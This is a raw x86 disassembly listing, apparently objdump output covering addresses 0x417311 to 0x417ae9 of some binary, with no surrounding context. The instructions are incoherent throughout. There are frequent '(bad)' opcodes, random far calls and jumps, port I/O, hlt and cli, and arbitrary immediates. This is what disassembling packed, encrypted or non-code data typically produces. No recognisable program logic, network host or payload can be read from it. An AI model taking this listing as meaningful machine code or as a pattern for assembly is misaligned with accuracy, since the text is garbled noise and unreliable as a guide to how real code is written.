  417311:	pop    edi
  417312:	stos   BYTE PTR es:[edi],al
  417313:	popa   
  417314:	iret   
  417315:	mov    bl,0xff
  417317:	call   0x233:0xb4be07f2
  41731e:	dec    ebx
  41731f:	xchg   ebp,eax
  417320:	inc    ebx
  417321:	push   0xffffff8e
  417323:	xchg   ecx,eax
  417324:	inc    edx
  417325:	xor    BYTE PTR [edx+0x1c2f2268],ah
  41732b:	out    dx,al
  41732c:	aaa    
  41732d:	shr    DWORD PTR [edi+ebx*4],1
  417330:	xor    esp,DWORD PTR [ebx+0x101451db]
  417336:	xchg   esp,eax
  417337:	push   ds
  417338:	test   eax,0x432a1289
  41733d:	(bad)  
  41733e:	js     0x41733a
  417340:	jmp    0x4172e5
  417342:	jae    0x4172cf
  417344:	inc    eax
  417345:	mov    ds:0x7db3491f,eax
  41734a:	dec    edx
  41734b:	cmc    
  41734c:	lea    edi,[eax+0x34]
  41734f:	push   ss
  417350:	bound  edx,QWORD PTR [eax-0x34]
  417353:	push   ss
  417354:	repz adc DWORD PTR [eax],eax
  417357:	je     0x41732e
  417359:	push   ds
  41735a:	shl    BYTE PTR es:[esi+0x3a],1
  41735e:	lahf   
  41735f:	hlt    
  417360:	ss inc edi
  417362:	lods   al,BYTE PTR ds:[esi]
  417363:	add    DWORD PTR [esi],0x78854709
  417369:	cmp    DWORD PTR [esi-0x26b4d34f],esp
  41736f:	(bad)  [ebp-0x32af4bdf]
  417375:	cdq    
  417376:	arpl   WORD PTR [ebp-0x71],sp
  417379:	iret   
  41737a:	dec    ebx
  41737b:	or     eax,0x9e7b2a2d
  417380:	out    0xcc,al
  417382:	pop    ss
  417383:	mov    eax,ds:0x2cee089b
  417388:	cmc    
  417389:	xchg   ebx,eax
  41738a:	sbb    eax,0x182b3173
  41738f:	and    edx,DWORD PTR [eax-0x2d]
  417392:	bound  edi,QWORD PTR [edx]
  417394:	loop   0x417399
  417396:	repz xchg ebp,eax
  417398:	cmp    edx,DWORD PTR [eax+0x1c]
  41739b:	jbe    0x4173f7
  41739d:	adc    eax,esi
  41739f:	das    
  4173a0:	xchg   edi,eax
  4173a1:	mov    bh,al
  4173a3:	and    ebp,edx
  4173a5:	dec    edx
  4173a6:	icebp  
  4173a7:	out    dx,eax
  4173a8:	mov    eax,0xe3e00336
  4173ad:	nop
  4173ae:	xchg   ebx,eax
  4173af:	xor    al,0x43
  4173b1:	xchg   BYTE PTR [edx-0x175751c1],ch
  4173b7:	lahf   
  4173b8:	out    0xc1,al
  4173ba:	add    ecx,DWORD PTR [ebp+0x6]
  4173bd:	mov    ds:0x62c893c6,al
  4173c2:	sbb    ecx,DWORD PTR [edx+0x76]
  4173c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4173c6:	test   al,0x56
  4173c8:	mov    eax,0x408fc7ac
  4173cd:	pushf  
  4173ce:	cs fdivp st(6),st
  4173d1:	mov    ebp,0x1f0547e4
  4173d6:	cmp    DWORD PTR [eax-0x73],edi
  4173d9:	dec    ebx
  4173da:	dec    ecx
  4173db:	or     bl,cl
  4173dd:	jnp    0x41736f
  4173df:	stos   BYTE PTR es:[edi],al
  4173e0:	mov    BYTE PTR [ecx],bl
  4173e2:	cli    
  4173e3:	push   cs
  4173e4:	mov    al,ds:0x2f679ccc
  4173e9:	daa    
  4173ea:	fwait
  4173eb:	push   cs
  4173ec:	mov    eax,0xa6303e63
  4173f1:	dec    ebx
  4173f2:	sbb    al,0x74
  4173f4:	gs gs push esi
  4173f7:	mov    cl,0xbc
  4173f9:	je     0x41740a
  4173fb:	adc    eax,0x947855bd
  417400:	sbb    al,0x79
  417402:	mov    eax,ds:0x37d2746e
  417407:	dec    edx
  417408:	push   cs
  417409:	fwait
  41740a:	or     bl,BYTE PTR [ebx-0x3691d905]
  417410:	scas   eax,DWORD PTR es:[edi]
  417411:	test   DWORD PTR [eax+esi*2+0x12500fb0],0x3edba5cf
  41741c:	data16 ins BYTE PTR es:[edi],dx
  41741e:	xchg   edx,eax
  41741f:	gs and ecx,esi
  417422:	mov    al,0x49
  417424:	das    
  417425:	xor    edi,DWORD PTR [edi-0x4e]
  417428:	mov    bl,0x4
  41742a:	push   ebp
  41742b:	popf   
  41742c:	inc    ecx
  41742d:	jmp    DWORD PTR [ebx-0xd23ef27]
  417433:	syscall 
  417435:	mov    dl,0xae
  417437:	nop
  417438:	(bad)  
  41743a:	not    al
  41743c:	mov    al,ds:0x8d641021
  417441:	sbb    DWORD PTR [ebp-0x15],esi
  417444:	jle    0x4173e7
  417446:	push   edi
  417447:	shl    BYTE PTR [ebp-0x35331407],1
  41744d:	inc    edx
  41744e:	pusha  
  41744f:	or     esi,DWORD PTR [eax+eiz*2-0x542554bc]
  417456:	int3   
  417457:	out    dx,al
  417458:	int    0x10
  41745a:	mov    BYTE PTR [edi-0x65],al
  41745d:	mov    bl,0x5c
  41745f:	dec    ebx
  417460:	mov    ds:0xa2400dad,al
  417465:	push   0xa90d483c
  41746a:	paddsb mm5,QWORD PTR [ebx]
  41746d:	int3   
  41746e:	inc    esp
  41746f:	mov    DWORD PTR [edi-0x16],ebx
  417472:	push   esi
  417473:	ds repnz scas eax,DWORD PTR es:[edi]
  417476:	and    al,0x85
  417478:	jge    0x41741c
  41747a:	leave  
  41747b:	sub    BYTE PTR [ebp-0x6d5352a9],bl
  417481:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  417483:	(bad)  
  417485:	mov    ds:0xec0c3834,eax
  41748a:	lahf   
  41748b:	or     cl,dl
  41748d:	out    dx,eax
  41748e:	mov    al,0x36
  417490:	rol    BYTE PTR [eax-0x39],0x29
  417494:	(bad)  
  417495:	lods   eax,DWORD PTR ds:[esi]
  417496:	inc    edi
  417497:	enter  0x94be,0x3d
  41749b:	adc    BYTE PTR [ebx+0x59],dh
  41749e:	push   edx
  41749f:	scas   eax,DWORD PTR es:[edi]
  4174a0:	sbb    ecx,DWORD PTR es:[edi-0x7b7d351d]
  4174a7:	out    dx,al
  4174a8:	cmp    eax,0x4d38ea6d
  4174ad:	repnz lea edx,[eax+0x1bfe16b]
  4174b4:	add    bl,dl
  4174b6:	aaa    
  4174b7:	mov    ebx,0x93134c77
  4174bc:	out    dx,al
  4174bd:	pop    eax
  4174be:	mov    dh,0x14
  4174c0:	adc    esp,0x56dca188
  4174c6:	sbb    al,0xb6
  4174c8:	mov    esi,0xa7c7e6c9
  4174cd:	pop    ebx
  4174ce:	dec    ebx
  4174cf:	add    eax,0x684ee98
  4174d4:	xor    BYTE PTR [ebp-0x44],dh
  4174d7:	lods   eax,DWORD PTR ds:[esi]
  4174d8:	xor    al,0x73
  4174da:	ret    0x4fad
  4174dd:	je     0x41746a
  4174df:	dec    ebx
  4174e0:	(bad)  
  4174e1:	or     bl,dl
  4174e3:	xchg   BYTE PTR [eax],dh
  4174e5:	inc    eax
  4174e6:	or     bl,bl
  4174e8:	and    DWORD PTR [edi+0x65],edx
  4174eb:	shl    BYTE PTR [ebx],1
  4174ed:	inc    eax
  4174ee:	ja     0x417560
  4174f0:	sub    BYTE PTR [ebp+edi*1+0x98d93c4],ah
  4174f7:	inc    esi
  4174f8:	mov    ch,BYTE PTR [esi-0x128dc222]
  4174fe:	sbb    edi,DWORD PTR [ecx-0x6680ef9]
  417504:	stc    
  417505:	fisubr WORD PTR [esi-0x52985067]
  41750b:	mov    bl,0x41
  41750d:	adc    al,BYTE PTR [ecx+0x30b603e7]
  417513:	ds xchg ah,dh
  417516:	add    dl,dh
  417518:	add    bl,BYTE PTR [edi+0x6b]
  41751b:	add    eax,esp
  41751d:	add    al,0xee
  41751f:	(bad)  
  417520:	xor    edx,ebp
  417522:	push   esp
  417523:	fistp  QWORD PTR [esi]
  417525:	cwde   
  417526:	jnp    0x417570
  417528:	sahf   
  417529:	sbb    al,0x10
  41752b:	fs inc edi
  41752d:	xchg   ebx,eax
  41752e:	int    0x60
  417530:	pop    ebx
  417531:	in     eax,dx
  417532:	cli    
  417533:	imul   eax,ebx,0xd523a116
  417539:	mov    esp,0x1322248b
  41753e:	sub    ah,ch
  417540:	sbb    DWORD PTR [esi+ecx*8+0x3e031fe],0x2df9c21d
  41754b:	xor    bh,ah
  41754d:	(bad)  
  41754e:	aam    0xd6
  417550:	in     al,dx
  417551:	pop    es
  417552:	fiadd  DWORD PTR [ebp-0x66c18c56]
  417558:	add    esp,DWORD PTR [ebx-0x2b]
  41755b:	(bad)  [edi]
  41755d:	out    dx,eax
  41755e:	(bad)  
  417560:	mov    eax,ds:0x809b1d9f
  417565:	pop    ds
  417566:	xchg   DWORD PTR [eax+0x37],edi
  417569:	xlat   BYTE PTR ds:[ebx]
  41756a:	scas   al,BYTE PTR es:[edi]
  41756b:	or     bl,BYTE PTR [edi+0x68f40444]
  417571:	mov    eax,0xf2bce234
  417576:	ja     0x417559
  417578:	inc    esp
  417579:	push   edi
  41757a:	or     ch,BYTE PTR [ebp+0x1a977dcc]
  417580:	adc    bl,BYTE PTR [edx+0x41ec6546]
  417586:	and    bl,BYTE PTR [ebp-0x6f5110c5]
  41758c:	vpshuflw xmm5,XMMWORD PTR [edx+0x9],0xaf
  417592:	xrelease lock add DWORD PTR [edx],0xd056f134
  41759a:	jne    0x417611
  41759c:	inc    ebx
  41759d:	inc    edi
  41759e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41759f:	xchg   BYTE PTR [ebp-0x4],al
  4175a2:	cwde   
  4175a3:	inc    esp
  4175a4:	xchg   ecx,eax
  4175a5:	shl    BYTE PTR [ecx],cl
  4175a7:	dec    ecx
  4175a8:	cmp    eax,0xd9dd401f
  4175ad:	cmp    eax,0x16c8535c
  4175b2:	in     al,dx
  4175b3:	(bad)  
  4175b4:	sbb    eax,0xac4cf484
  4175b9:	lods   al,BYTE PTR ds:[esi]
  4175ba:	inc    esp
  4175bb:	ret    0xd62f
  4175be:	mov    edi,0xe30aadf2
  4175c3:	xchg   BYTE PTR [edi-0x30b5ee17],bh
  4175c9:	es in  eax,dx
  4175cb:	test   al,0x42
  4175cd:	xchg   edi,eax
  4175ce:	cld    
  4175cf:	fs out dx,ax
  4175d2:	cmc    
  4175d3:	in     al,0xa0
  4175d5:	aaa    
  4175d6:	push   esi
  4175d7:	cmc    
  4175d8:	js     0x41758c
  4175da:	(bad)  
  4175db:	dec    edi
  4175dc:	in     al,0xc3
  4175de:	ror    cl,1
  4175e0:	lahf   
  4175e1:	(bad)  
  4175e2:	and    DWORD PTR [ecx-0x1abea743],edi
  4175e8:	add    eax,0xc8ce3d7c
  4175ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4175ee:	pop    ebx
  4175ef:	in     eax,dx
  4175f0:	mov    BYTE PTR [esi],dh
  4175f2:	inc    edi
  4175f3:	retf   
  4175f4:	(bad)  
  4175f5:	jns    0x4175e2
  4175f7:	clc    
  4175f8:	jb     0x41765d
  4175fa:	inc    esi
  4175fb:	test   DWORD PTR [ecx+0x76],0x158d1a92
  417602:	mov    bh,0xe
  417604:	xor    esp,DWORD PTR [esi+ebx*2-0x9]
  417608:	popw   ss
  41760a:	mov    edi,0x8b15f10c
  41760f:	fucom  st(2)
  417611:	jns    0x41759f
  417613:	jmp    0x4175d8
  417615:	fwait
  417616:	xchg   ecx,eax
  417617:	jo     0x417610
  417619:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41761a:	not    BYTE PTR [ebp-0xa]
  41761d:	in     eax,0x4b
  41761f:	mov    ebx,0x77ab815f
  417624:	lds    ebp,FWORD PTR [ebp-0x666c85bc]
  41762a:	adc    ch,bh
  41762c:	and    BYTE PTR [eax+0x39],ch
  41762f:	cmp    ebx,esi
  417631:	cmc    
  417632:	fist   WORD PTR [edi]
  417634:	bound  eax,QWORD PTR ds:0x5d603b64
  41763a:	or     edi,DWORD PTR [edx]
  41763c:	pop    edi
  41763d:	data16 mov cl,0x78
  417640:	hlt    
  417641:	jb     0x4175f4
  417643:	sub    al,0x51
  417645:	ffreep st(0)
  417647:	scas   eax,DWORD PTR es:[edi]
  417648:	cs hlt 
  41764a:	repz mov eax,0x7830624c
  417650:	call   FWORD PTR [edx-0x69941cbb]
  417656:	es in  eax,dx
  417658:	xchg   ebp,eax
  417659:	popf   
  41765a:	test   BYTE PTR [esi],ah
  41765c:	or     BYTE PTR [ebp-0x447c3325],0xa3
  417663:	mov    esp,0x98998670
  417668:	sub    al,0xed
  41766a:	push   edx
  41766b:	xchg   ecx,eax
  41766c:	push   esi
  41766d:	shr    BYTE PTR [eax+0x6274972d],1
  417673:	mov    edx,0x9ececcc
  417678:	mov    ecx,0xfaf45d39
  41767d:	loop   0x41761e
  41767f:	mov    esi,DWORD PTR es:[ecx]
  417682:	dec    esp
  417683:	imul   edi,edx,0x43
  417686:	jb     0x417616
  417688:	sbb    ch,BYTE PTR [ecx+eax*1]
  41768b:	mov    ah,0x99
  41768d:	out    0x99,eax
  41768f:	push   cs
  417690:	(bad)  
  417691:	dec    esi
  417692:	or     al,0x12
  417694:	jmp    0x939e:0x7e499418
  41769b:	lea    ebx,[ecx]
  41769d:	inc    esp
  41769e:	fdivrp st(3),st
  4176a0:	pop    esp
  4176a1:	int3   
  4176a2:	push   ebx
  4176a3:	push   DWORD PTR [edx]
  4176a5:	test   eax,0x1d31a0d8
  4176aa:	(bad)  
  4176ab:	shl    BYTE PTR [edx],cl
  4176ad:	or     al,0x3f
  4176af:	xor    cl,dh
  4176b1:	sti    
  4176b2:	lahf   
  4176b3:	(bad)  
  4176b5:	push   cs
  4176b6:	fcmovb st,st(6)
  4176b8:	mov    WORD PTR [esi],ss
  4176ba:	cdq    
  4176bb:	mov    al,0xfe
  4176bd:	xor    ch,al
  4176bf:	jb     0x4176c6
  4176c1:	retf   0xb59
  4176c4:	lods   eax,DWORD PTR ds:[esi]
  4176c5:	mov    ds:0x5d693fb5,eax
  4176ca:	push   0x44
  4176cc:	outs   dx,DWORD PTR ds:[esi]
  4176cd:	lock lea ebp,[esi]
  4176d0:	cmp    eax,0x2bc0dd5
  4176d5:	mov    ebx,0xfb9d9c35
  4176da:	sub    BYTE PTR [esp+eax*8],cl
  4176dd:	mov    ah,0xb
  4176df:	push   ecx
  4176e0:	jo     0x41773a
  4176e2:	xor    ebx,DWORD PTR [edi+esi*8-0x1b]
  4176e6:	rcl    BYTE PTR [esi+0x36],cl
  4176e9:	push   es
  4176ea:	or     DWORD PTR [edx-0x3a],edx
  4176ed:	push   eax
  4176ee:	inc    cx
  4176f0:	(bad)  
  4176f1:	(bad)  
  4176f2:	(bad)  
  4176f3:	stc    
  4176f4:	(bad)  
  4176f5:	dec    ebp
  4176f6:	fistp  DWORD PTR [ebx-0x31505b45]
  4176fc:	(bad)
  417700:	jl     0x4176f7
  417702:	push   esi
  417703:	pop    ebp
  417704:	cdq    
  417705:	nop
  417706:	jne    0x417718
  417708:	mov    dh,0x16
  41770a:	fidiv  WORD PTR [edx+0x6ca21c4c]
  417710:	test   BYTE PTR [ebx-0x30143a3d],ch
  417716:	jle    0x41771a
  417718:	adc    edi,DWORD PTR [edi+0x470f2202]
  41771e:	mov    ds:0x29400ec3,eax
  417723:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417724:	push   eax
  417725:	sahf   
  417726:	aaa    
  417727:	loopne 0x41770c
  417729:	lock ins BYTE PTR es:[edi],dx
  41772b:	shl    edx,1
  41772d:	jp     0x4176cc
  41772f:	ja     0x417747
  417731:	push   ebx
  417732:	add    al,0xda
  417734:	or     eax,0xe8fd0dfc
  417739:	cwde   
  41773a:	rol    BYTE PTR [edx-0x4d],1
  41773d:	push   0xfffffffc
  41773f:	(bad)  
  417740:	mov    al,ds:0x7c363432
  417745:	push   esi
  417746:	xchg   esp,eax
  417747:	sub    BYTE PTR [ebx],al
  417749:	inc    esi
  41774a:	xchg   edx,eax
  41774b:	shl    DWORD PTR [ecx-0x5c4427e1],1
  417751:	pushf  
  417752:	inc    ecx
  417753:	imul   DWORD PTR [edi]
  417755:	(bad)  
  417756:	into   
  417757:	or     DWORD PTR [ecx+esi*2-0x49],0x8c0c91b9
  41775f:	popf   
  417760:	mov    esi,esp
  417762:	inc    esi
  417763:	imul   edi,DWORD PTR [ecx+0x7c],0xffffff99
  417767:	jle    0x41779d
  417769:	xor    BYTE PTR [edx-0x3a44023d],ch
  41776f:	ret    
  417770:	or     eax,0xf4f9006c
  417775:	ins    DWORD PTR es:[edi],dx
  417776:	dec    eax
  417777:	loop   0x41775c
  417779:	out    dx,eax
  41777a:	sub    al,0xff
  41777c:	add    al,0x59
  41777e:	gs jle 0x41777e
  417781:	inc    edx
  417782:	ret    
  417783:	imul   esp,DWORD PTR [ecx+0x7a083607],0x6f
  41778a:	ret    
  41778b:	mov    dh,0x49
  41778d:	cmp    eax,0x2ef54781
  417792:	fstp   QWORD PTR [esi+0x48]
  417795:	mov    dh,0x5b
  417797:	cmp    eax,0x15fd3d88
  41779c:	cmp    al,0xe9
  41779e:	js     0x417748
  4177a0:	jbe    0x4177dd
  4177a2:	fnstcw WORD PTR [edx-0xc]
  4177a5:	and    eax,DWORD PTR [edx]
  4177a7:	fbld   TBYTE PTR [edx+0x5a355887]
  4177ad:	and    BYTE PTR [ecx+0x4f3d6f9b],0x9d
  4177b4:	es mov edi,0xfc220791
  4177ba:	xchg   ebp,eax
  4177bb:	sub    edi,ebp
  4177bd:	or     al,0x6c
  4177bf:	stos   BYTE PTR es:[edi],al
  4177c0:	inc    edx
  4177c1:	sub    BYTE PTR [esi+0x63],al
  4177c4:	repnz mov ecx,0x810fa638
  4177ca:	sub    cl,BYTE PTR [edi]
  4177cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4177cd:	fisub  WORD PTR [ecx]
  4177cf:	add    eax,0xf7886bd4
  4177d4:	js     0x41782a
  4177d6:	mov    es,WORD PTR [ebp+0x53652945]
  4177dc:	sbb    al,0x2b
  4177de:	dec    esp
  4177df:	adc    esi,edx
  4177e1:	mov    cl,0x4b
  4177e3:	div    esp
  4177e5:	stos   DWORD PTR es:[edi],eax
  4177e6:	test   eax,0xe56e2474
  4177eb:	stos   BYTE PTR es:[edi],al
  4177ec:	aad    0xb
  4177ee:	mov    al,ds:0xbca7e87c
  4177f3:	jb     0x4177f9
  4177f5:	mov    esi,0xd3d966ff
  4177fa:	jno    0x4177ef
  4177fc:	lock add BYTE PTR [ecx+ebx*2],bh
  417800:	(bad)  
  417801:	sbb    al,0xd2
  417803:	sbb    eax,0xe37e10e7
  417808:	out    0x98,eax
  41780a:	imul   esp,ebp,0x67
  41780d:	fiadd  DWORD PTR [eax+0x6351299]
  417813:	push   eax
  417814:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417815:	mov    dl,0x6c
  417817:	mov    ds:0x672a20b7,al
  41781c:	clc    
  41781d:	add    DWORD PTR [ebx+eax*2+0x2e],eax
  417821:	mov    bh,0xa6
  417823:	inc    al
  417825:	lds    eax,FWORD PTR [ebx-0x6576bb75]
  41782b:	lds    eax,FWORD PTR [ebx]
  41782d:	and    DWORD PTR [edx-0x3d883686],esi
  417833:	es push esp
  417835:	loop   0x4177c2
  417837:	pop    es
  417838:	int    0x2c
  41783a:	mov    bl,0xff
  41783c:	shr    DWORD PTR [esi-0x1f7842b9],1
  417842:	pminub mm3,mm4
  417845:	xor    DWORD PTR [edi-0x6c7acec4],0xffffffac
  41784c:	dec    edi
  41784d:	es aad 0xb2
  417850:	push   edx
  417851:	lahf   
  417852:	(bad)  
  417853:	inc    edx
  417854:	arpl   WORD PTR [edi-0x51],di
  417857:	xchg   edx,eax
  417858:	jge    0x417841
  41785a:	out    0x2c,al
  41785c:	cli    
  41785d:	div    DWORD PTR [ebp+0x7b3bf720]
  417863:	ret    0x120e
  417866:	sub    dh,bl
  417868:	push   eax
  417869:	xchg   ebx,eax
  41786a:	test   DWORD PTR [ecx+eiz*4+0x62],esp
  41786e:	pusha  
  41786f:	xchg   edx,eax
  417870:	dec    esi
  417871:	nop
  417872:	or     BYTE PTR [edi-0xcb657d1],0xd3
  417879:	popa   
  41787a:	push   eax
  41787b:	call   0xaf08:0x906b9d7a
  417882:	add    esp,DWORD PTR [edi+0x515315f6]
  417888:	loop   0x4178d5
  41788a:	gs repnz add al,0x5f
  41788e:	jbe    0x41782e
  417890:	les    eax,FWORD PTR [edi]
  417892:	dec    ebx
  417893:	in     eax,0x42
  417895:	push   esp
  417896:	and    BYTE PTR [edi+0x7bf9f31a],0xbf
  41789d:	in     eax,0x72
  41789f:	mov    ah,0x47
  4178a1:	jbe    0x4178f5
  4178a3:	lock mov al,0x79
  4178a6:	lods   al,BYTE PTR ds:[esi]
  4178a7:	pusha  
  4178a8:	push   ss
  4178a9:	xchg   BYTE PTR [edx+0x44],bl
  4178ac:	call   0xf439:0x496d0f0d
  4178b3:	stos   DWORD PTR es:[edi],eax
  4178b4:	test   al,0x1f
  4178b6:	shl    BYTE PTR [ebx-0x24e0978a],cl
  4178bc:	daa    
  4178bd:	inc    edi
  4178be:	(bad)  
  4178bf:	jg     0x41793e
  4178c1:	xchg   edx,eax
  4178c2:	mov    eax,0x123067db
  4178c7:	push   esp
  4178c8:	inc    ebx
  4178c9:	mov    ?,WORD PTR [edi-0x64]
  4178cc:	pop    eax
  4178cd:	adc    dh,bl
  4178cf:	and    DWORD PTR [ecx],eax
  4178d1:	mov    gs,WORD PTR [eax]
  4178d3:	mov    al,0x18
  4178d5:	rcl    DWORD PTR [ecx-0x7f12034e],1
  4178db:	out    0xb0,eax
  4178dd:	add    ecx,DWORD PTR [ebp-0x6e]
  4178e0:	pop    ss
  4178e1:	and    dl,dh
  4178e3:	mov    cl,0x4a
  4178e5:	outs   dx,DWORD PTR ds:[esi]
  4178e6:	jmp    0x523c4665
  4178eb:	xchg   BYTE PTR [ecx-0x31532eda],dh
  4178f1:	int3   
  4178f2:	fcmovnu st,st(6)
  4178f4:	dec    ebp
  4178f5:	xchg   edx,edi
  4178f7:	push   ebx
  4178f8:	inc    ebx
  4178f9:	lock std 
  4178fb:	test   DWORD PTR [edi],eax
  4178fd:	ss ins DWORD PTR es:[edi],dx
  4178ff:	add    al,0x1b
  417901:	mov    esi,0x14e4d47f
  417906:	xor    BYTE PTR [eax+esi*2+0x75],ch
  41790a:	pop    ebp
  41790b:	xchg   ebx,eax
  41790c:	xchg   ebp,eax
  41790d:	(bad)  
  41790e:	sub    BYTE PTR [ebx-0x16562645],bl
  417914:	jae    0x4178ca
  417916:	adc    eax,0x34bb6abc
  41791b:	aad    0x36
  41791d:	pop    esp
  41791e:	test   al,0xe4
  417920:	and    esi,DWORD PTR [ebx]
  417922:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417923:	or     DWORD PTR [ecx-0x77],edi
  417926:	inc    DWORD PTR [ebx-0x15f69f22]
  41792c:	jge    0x417945
  41792e:	out    dx,eax
  41792f:	cmp    esi,0xffffff85
  417932:	jp     0x41790c
  417934:	mov    ecx,0x5ced1209
  417939:	adc    ch,0x78
  41793c:	push   eax
  41793d:	outs   dx,DWORD PTR ds:[esi]
  41793e:	aam    0x98
  417940:	xchg   ebx,eax
  417941:	mov    dh,0x9f
  417943:	cmp    al,0x32
  417945:	lea    ebx,[ebx]
  417947:	and    eax,esi
  417949:	add    ebp,DWORD PTR [ecx-0x67]
  41794c:	fdiv   QWORD PTR [ecx+esi*4-0x7e]
  417950:	sbb    al,0x75
  417952:	cmp    BYTE PTR ds:0xfd901ec6,ah
  417958:	mov    dh,0x56
  41795a:	or     al,0xcc
  41795c:	jnp    0x417917
  41795e:	stos   BYTE PTR es:[edi],al
  41795f:	pop    ds
  417960:	push   ebp
  417961:	repnz in al,0x38
  417964:	mov    ah,bh
  417966:	imul   edi,ebx,0xadcf6d8b
  41796c:	jbe    0x41794f
  41796e:	mov    bh,0x30
  417970:	mov    edx,0x10901641
  417975:	neg    BYTE PTR [ebx+0x4b]
  417978:	std    
  417979:	fucomi st,st(1)
  41797b:	add    ecx,DWORD PTR [eax-0x59]
  41797e:	imul   esi,DWORD PTR [ecx-0x38],0xfffffff4
  417982:	push   esp
  417983:	add    BYTE PTR [esi+0x3c9d87a1],dh
  417989:	adc    eax,esi
  41798b:	add    DWORD PTR [esi+0x3a],eax
  41798e:	jmp    0xe47d:0x9a4e3c33
  417995:	and    eax,0x6ee83966
  41799a:	pop    edx
  41799b:	stc    
  41799c:	rcr    DWORD PTR [eax+0x4d],cl
  41799f:	div    BYTE PTR [esi+0x35c769a1]
  4179a5:	adc    BYTE PTR [eax-0x32],dh
  4179a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4179a9:	fisttp DWORD PTR [esi-0x2b1e880a]
  4179af:	sub    DWORD PTR [edi],edx
  4179b1:	xchg   ebx,eax
  4179b2:	cmp    BYTE PTR [ebp+0x79],al
  4179b5:	ins    DWORD PTR es:[edi],dx
  4179b6:	mov    ch,0xa4
  4179b8:	jne    0x417a31
  4179ba:	stos   DWORD PTR es:[edi],eax
  4179bb:	xor    eax,0x1c34b49f
  4179c0:	jne    0x41794e
  4179c2:	or     al,0x8b
  4179c4:	(bad)  
  4179c6:	cmp    al,BYTE PTR [edi]
  4179c8:	push   ss
  4179c9:	(bad)  
  4179cb:	or     ecx,ecx
  4179cd:	push   ss
  4179ce:	scas   al,BYTE PTR es:[edi]
  4179cf:	mov    eax,0x445e00b8
  4179d4:	xchg   ch,ch
  4179d6:	ss inc ebp
  4179d8:	pop    ebp
  4179da:	jl     0x417a13
  4179dc:	scas   al,BYTE PTR es:[edi]
  4179dd:	add    dh,dl
  4179df:	mov    esi,0xf0dc9002
  4179e4:	adc    dh,BYTE PTR [ebx]
  4179e6:	mov    ebx,0xbd57dd6e
  4179eb:	push   cs
  4179ec:	jnp    0x417a58
  4179ee:	xchg   ecx,esp
  4179f0:	sbb    eax,0xabb48224
  4179f5:	add    ecx,0xffffffbc
  4179f8:	stos   BYTE PTR es:[edi],al
  4179f9:	mov    cl,0xd4
  4179fb:	ins    BYTE PTR es:[edi],dx
  4179fc:	pusha  
  4179fd:	cmp    ebx,DWORD PTR [edi]
  4179ff:	iret   
  417a00:	rcr    BYTE PTR [edx+esi*2-0xe],0x80
  417a05:	(bad)  
  417a06:	ins    DWORD PTR es:[edi],dx
  417a07:	out    dx,al
  417a08:	push   0xac3e87db
  417a0d:	scas   eax,DWORD PTR es:[edi]
  417a0e:	out    0xbc,eax
  417a10:	cdq    
  417a11:	aam    0x89
  417a13:	fldenv [ebp+0x61a567fe]
  417a19:	dec    esp
  417a1a:	stos   DWORD PTR es:[edi],eax
  417a1b:	fsubr  DWORD PTR [esi-0x7fd1f2e2]
  417a21:	xchg   DWORD PTR [eax],ecx
  417a23:	pop    ss
  417a24:	leave  
  417a25:	xor    eax,0x8b6ff7e0
  417a2a:	xchg   BYTE PTR [edi+0x20],al
  417a2d:	(bad)  
  417a2e:	mov    dl,0x81
  417a30:	dec    esp
  417a31:	and    BYTE PTR [edi+0x48088bd3],dh
  417a37:	sub    eax,0xeae25b3c
  417a3c:	pop    ds
  417a3d:	adc    ebx,DWORD PTR ds:0xa489c96f
  417a43:	adc    eax,0x31565962
  417a48:	pop    ss
  417a49:	enter  0xc06e,0x97
  417a4d:	arpl   WORD PTR ds:0xa363f318,cx
  417a53:	ins    BYTE PTR es:[edi],dx
  417a54:	push   ebx
  417a55:	int    0x9
  417a57:	and    eax,0x7709557e
  417a5c:	data16 adc BYTE PTR [esp+eax*8+0x43],bh
  417a61:	pop    eax
  417a62:	hlt    
  417a63:	sbb    DWORD PTR [edx],ebp
  417a65:	scas   al,BYTE PTR es:[edi]
  417a66:	cwde   
  417a67:	dec    eax
  417a68:	cld    
  417a69:	push   eax
  417a6a:	jbe    0x417ad2
  417a6c:	cwde   
  417a6d:	xor    DWORD PTR [edx],esi
  417a6f:	inc    eax
  417a70:	fldenv [edx]
  417a72:	sar    eax,cl
  417a74:	mov    DWORD PTR [ebp+0x76],esi
  417a77:	mov    eax,0x1548c45d
  417a7c:	data16 das 
  417a7e:	adc    DWORD PTR [eax-0x57],esp
  417a81:	or     eax,0x18d98e23
  417a86:	fs aam 0x4d
  417a89:	rcr    BYTE PTR ds:0x486e6954,cl
  417a8f:	mov    esp,0x721e8e3b
  417a94:	dec    ecx
  417a95:	jecxz  0x417b02
  417a97:	dec    eax
  417a98:	fdiv   st(5),st
  417a9a:	test   BYTE PTR [edi],cl
  417a9c:	ins    DWORD PTR es:[edi],dx
  417a9d:	pop    ss
  417a9e:	aam    0x4d
  417aa0:	popa   
  417aa1:	push   esi
  417aa2:	sar    WORD PTR [esi+ecx*8+0x9ac7016],0xa6
  417aab:	retf   
  417aac:	xchg   edx,eax
  417aad:	xor    al,0xd5
  417aaf:	repz xor al,0x67
  417ab2:	shl    DWORD PTR [esi+0x2a],cl
  417ab5:	add    edx,DWORD PTR [ebx-0x29]
  417ab8:	mov    ebp,0xc1983750
  417abd:	or     al,0x9b
  417abf:	stc    
  417ac0:	inc    eax
  417ac1:	jmp    0x77ca:0xc0e96f1f
  417ac8:	fstp   DWORD PTR [ebx+0x4e]
  417acb:	adc    eax,0xd4eceae7
  417ad0:	xchg   ebp,eax
  417ad1:	fdivr  QWORD PTR [ecx+0x42020636]
  417ad7:	pop    esp
  417ad8:	jl     0x417a98
  417ada:	pop    ecx
  417adb:	mov    bl,0x23
  417add:	scas   eax,DWORD PTR es:[edi]
  417ade:	aad    0x3c
  417ae0:	pushf  
  417ae1:	(bad)  
  417ae2:	scas   eax,DWORD PTR es:[edi]
  417ae3:	in     al,0x11
  417ae5:	fs aas 
  417ae7:	xchg   edx,eax
  417ae8:	retf   
  417ae9:	lock mov dh,0x1c
